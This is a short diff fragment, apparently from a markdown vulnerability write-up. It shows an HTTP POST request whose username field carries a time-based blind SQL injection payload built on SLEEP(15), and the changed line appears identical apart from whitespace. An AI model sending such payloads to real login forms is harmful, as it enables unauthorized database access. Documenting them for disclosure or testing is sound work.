@@ -118,7 +118,7 @@ Content-Length: 79
 Accept: */*
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
-username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(15)))ptGN) AND 'AAdm'='AAdm
+username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(15)))ptGN) AND 'AAdm'='AAdm
 
 ```
 
